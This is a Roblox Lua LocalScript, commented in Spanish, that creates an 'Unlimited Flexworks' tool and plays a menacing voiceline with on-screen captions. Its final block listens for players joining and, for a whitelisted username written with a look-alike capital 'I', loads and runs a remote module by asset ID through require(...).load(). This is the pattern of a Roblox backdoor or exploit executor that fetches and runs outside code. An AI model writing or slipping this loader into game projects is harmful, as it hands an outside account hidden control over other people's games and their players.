-- LocalScript: Unlimited Flexworks + Auto Module Loader
-- Colócalo en StarterPlayerScripts o StarterCharacterScripts

-- Define Services  
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local SoundService = game:GetService("SoundService")

local player = Players.LocalPlayer
local isPlaying = false
local tool = nil -- referencia global

print("[DEBUG] LocalScript Loaded")

-- Tool Name & Version
local TOOL_NAME = "Unlimited Flexworks"
local TOOL_VERSION = "1.6"

-- Whitelist
local WHITELIST = {
    AlexCoderOficiaI = true -- la "i" mayúscula al final
}

-- Función para eliminar herramientas antiguas
local function removeOutdatedTools()
    print("[DEBUG] Removing outdated tools")
    local backpack = player:FindFirstChild("Backpack")
    local starterGear = player:FindFirstChild("StarterGear")

    if backpack then
        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA("Tool") and item.Name == TOOL_NAME then
                item:Destroy()
            end
        end
    end

    if starterGear then
        for _, item in pairs(starterGear:GetChildren()) do
            if item:IsA("Tool") and item.Name == TOOL_NAME then
                item:Destroy()
            end
        end
    end
end

-- Función para mostrar captions tipo "máquina de escribir"
local function playCaptions(textSequence, delays, speed)
    print("[DEBUG] Displaying captions")
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FlexworksCaptionGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local usernameLabel = Instance.new("TextLabel")
    usernameLabel.Size = UDim2.new(0.6, 0, 0.05, 0)
    usernameLabel.Position = UDim2.new(0.2, 0, 0.75, 0)
    usernameLabel.BackgroundTransparency = 1
    usernameLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
    usernameLabel.Font = Enum.Font.SourceSansBold
    usernameLabel.TextScaled = true
    usernameLabel.Text = "[" .. player.Name .. "]"
    usernameLabel.Parent = screenGui

    local captionLabel = Instance.new("TextLabel")
    captionLabel.Size = UDim2.new(0.6, 0, 0.05, 0)
    captionLabel.Position = UDim2.new(0.2, 0, 0.8, 0)
    captionLabel.BackgroundTransparency = 1
    captionLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
    captionLabel.Font = Enum.Font.SourceSansBold
    captionLabel.TextScaled = true
    captionLabel.Text = ""
    captionLabel.Parent = screenGui

    for i, text in ipairs(textSequence) do
        local typeSpeed = speed[i] or 0.05
        for j = 1, #text do
            captionLabel.Text = string.sub(text, 1, j)
            wait(typeSpeed)
        end
        wait(delays[i] or 0.5)
    end
    wait(2)
    screenGui:Destroy()
end

-- Función para reproducir sonido y captions al iniciar
local function playExecution()
    print("[DEBUG] Playing execution voiceline and captions at startup")

    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://132515779133572"
    sound.Volume = 2
    sound.Looped = false
    sound.Parent = SoundService
    sound:Play()

    playCaptions(
        {"I'm done messing around...", "This should end it all."},
        {0.5, 0.5},
        {0.05, 0.05}
    )
end

-- Funciones de creación y setup de herramienta
local function createTool()
    local t = Instance.new("Tool")
    t.Name = TOOL_NAME
    t.RequiresHandle = false
    t.Parent = player:WaitForChild("Backpack")
    return t
end

local function setupTool()
    if tool then
        tool.Activated:Connect(function()
            print("[DEBUG] Tool activated")
        end)
    end
end

local function ensureToolPersistence()
    removeOutdatedTools()
    if tool then
        tool.Parent = player:WaitForChild("Backpack")
    end
end

-- Inicializa herramienta
print("[DEBUG] Initializing tool")
tool = createTool()
setupTool()
ensureToolPersistence()

-- Ejecuta audio y captions al inicio
playExecution()

-- ESPERA 5 SEGUNDOS ANTES DE CONECTAR PlayerAdded
wait(5)

-- Ejecuta asset remoto solo si el jugador está en whitelist
Players.PlayerAdded:Connect(function(p)
    if WHITELIST[p.Name] then
        p.CharacterAdded:Connect(function(char)
            -- Esto requiere que el asset sea público
            local success, err = pcall(function()
                require(18808399962).load(p.Name)
            end)
            if not success then
                warn("[ERROR] Failed to load module for", p.Name, err)
            else
                print("[DEBUG] Module loaded for", p.Name)
            end
        end)
    end
end)

print("[DEBUG] LocalScript execution completed")
